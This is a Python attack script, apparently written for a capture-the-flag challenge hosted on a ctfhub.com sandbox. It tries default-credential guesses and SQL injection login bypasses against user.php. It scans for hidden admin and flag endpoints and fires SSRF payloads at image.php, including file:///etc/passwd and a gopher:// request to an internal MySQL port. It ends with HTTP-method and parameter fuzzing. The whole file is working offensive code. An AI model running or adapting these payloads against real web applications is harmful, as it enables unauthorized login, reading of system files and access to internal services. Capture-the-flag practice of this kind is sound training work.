#!/usr/bin/env python3
"""Explore WebsiteManger - login bypass, find tester feature."""
import requests

TARGET = "http://challenge-ab97d555c14efe7b.sandbox.ctfhub.com:10800"

def try_login(username, password):
    r = requests.post(f"{TARGET}/user.php",
                      data={"username": username, "password": password},
                      timeout=10)
    return len(r.text), r.text

# Test various login bypasses
print("=== Login bypass attempts ===")
tests = [
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("root", "root"),
    ("ctf", "ctf"),
    # Array tricks
    ({"key": "admin"}, "x"),
    # Type juggling
    ("admin", "0"),
    ("admin", "true"),
    # SQLi with different quote styles
    ("admin'--", "x"),
    ("admin'#", "x"),
    ("admin'/**/or/**/1=1--", "x"),
    ("admin'/**/||/**/1=1--", "x"),
    ("'/**/or/**/1=1--", "x"),
]

for user, pw in tests:
    try:
        if isinstance(user, dict):
            r = requests.post(f"{TARGET}/user.php", data={"username": "admin", "password": "x"},
                              params=user, timeout=10)
            size = len(r.text)
        else:
            size, text = try_login(user, pw)
        if size not in [12, 13]:
            print(f"  DIFFERENT ({size}B): user={user}, pw={pw}")
            print(f"    {text[:200]}")
    except Exception as e:
        print(f"  ERROR: {e}")

# Scan for endpoints
print("\n=== Endpoint scan ===")
paths = [
    "admin", "backend", "panel", "dashboard", "home", "main", "test",
    "tools", "tool", "check", "fetch", "api", "proxy", "curl", "fetch_url",
    "test_url", "check_url", "scan", "url", "site", "add_site",
    "manage", "manager", "settings", "profile", "account", "register",
    "signup", "forgot", "reset", "logout", "upload", "download",
    "flag", "flag.txt", "flag.php", "secret", "hidden",
    "phpmyadmin", "adminer", "debug", "info", "phpinfo",
]
found = []
for path in paths:
    try:
        r = requests.get(f"{TARGET}/{path}", timeout=5, allow_redirects=False)
        if r.status_code != 404:
            found.append((path, r.status_code, len(r.text)))
            print(f"  {path}: HTTP {r.status_code} ({len(r.text)}B)")
    except:
        pass

# Test image.php for SSRF
print("\n=== SSRF test on image.php ===")
for url_test in [
    "http://127.0.0.1/user.php",
    "file:///etc/passwd",
    "http://127.0.0.1/flag.php",
    "gopher://127.0.0.1:3306/_",
]:
    try:
        r = requests.get(f"{TARGET}/image.php", params={"id": url_test}, timeout=5)
        if len(r.text) > 100:
            print(f"  {url_test}: {len(r.text)}B response")
        elif len(r.text) > 0:
            print(f"  {url_test}: {len(r.text)}B - {r.text[:100]}")
        else:
            print(f"  {url_test}: empty")
    except:
        pass

# Try HTTP methods on user.php
print("\n=== HTTP methods on user.php ===")
for method in ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]:
    try:
        r = requests.request(method, f"{TARGET}/user.php", timeout=5)
        print(f"  {method}: {r.status_code} ({len(r.text)}B)")
    except:
        pass

# Check if image.php has other parameters
print("\n=== image.php parameter fuzzing ===")
for param in ["id", "file", "url", "src", "path", "name", "img", "image", "f", "p", "page", "load", "fetch"]:
    try:
        r = requests.get(f"{TARGET}/image.php", params={param: "1"}, timeout=5)
        if len(r.text) > 0 and len(r.text) < 100:
            print(f"  {param}=1: {len(r.text)}B - {r.text[:100]}")
    except:
        pass
